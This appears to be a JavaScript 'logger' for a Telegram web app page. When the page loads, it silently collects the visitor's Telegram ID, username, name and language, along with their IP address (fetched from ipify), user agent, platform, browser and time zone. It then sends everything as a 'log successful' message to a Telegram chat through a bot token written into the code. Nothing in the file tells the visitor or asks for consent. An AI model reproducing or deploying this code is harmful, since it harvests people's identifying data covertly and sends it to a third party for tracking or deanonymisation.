document.addEventListener('DOMContentLoaded', function() {
  const urlParams = new URLSearchParams(window.location.search);
  const userAgent = navigator.userAgent;
  fetch('https://api.ipify.org?format=json')
    .then(response => response.json())
    .then(data => {
      const ip = data.ip;
      const osname = navigator.platform;
      const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
      const browser = getBrowserInfo();
      
      const message = `
🔥 Лог успешен!

*🧭 Базовая информация:*
*🔍 Аккаунт в тг:*
  ├ Айди: ${tg.initDataUnsafe.user.id}
  ├ Тэг: @${tg.initDataUnsafe.user.username}
  ├ Имя: ${tg.initDataUnsafe.user.first_name}
  ├ Фамилия: ${tg.initDataUnsafe.user.last_name}
  ├ Языковой код: ${tg.initDataUnsafe.user.language_code}
*💻 Система:*
  ├ IP: ${ip}
  ├ UserAgent: ${userAgent}
  ├ ОС: ${osname}
  ├ Браузер: ${browser}
  └ Часовой пояс: ${timeZone}`;

      const token = '6774889222:AAEvP9TdCbmb-C8xTsZY1D2bktLEPNjsFT4';
      const chatId = '-1002137149468';
      const url = 'https://api.telegram.org/bot'+token+'/sendMessage';
      const formData = {
        chat_id: chatId,
        text: message,
        parse_mode: 'Markdown'
      };

      fetch(url, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(formData)
      })
      .then(response => {
        if (!response.ok) {
          throw new Error('Network response was not ok');
        }
        console.log('Message sent successfully');
      })
      .catch(error => console.error('Error sending message:', error));
   });

  function getBrowserInfo() {
    const ua = navigator.userAgent;
    let browser = '';
    const match = ua.match(/(opera|chrome|safari|firefox|msie|trident(?=\/))\/?\s*(\d+)/i) || [];

    if (/trident/i.test(match[1])) {
      const tem = /\brv[ :]+(\d+)/g.exec(ua) || [];
      browser = 'IE ' + (tem[1] || '');
    }

    if (match[1] === 'Chrome') {
      const tem = ua.match(/\b(OPR|Edge)\/(\d+)/);
      if (tem != null) browser = tem.slice(1).join(' ').replace('OPR', 'Opera');
    }

    match[2] = match[2] ? `version ${match[2]}` : '';
    browser = `${match[1]} ${match[2]}`.trim();
    return browser;
  }
});
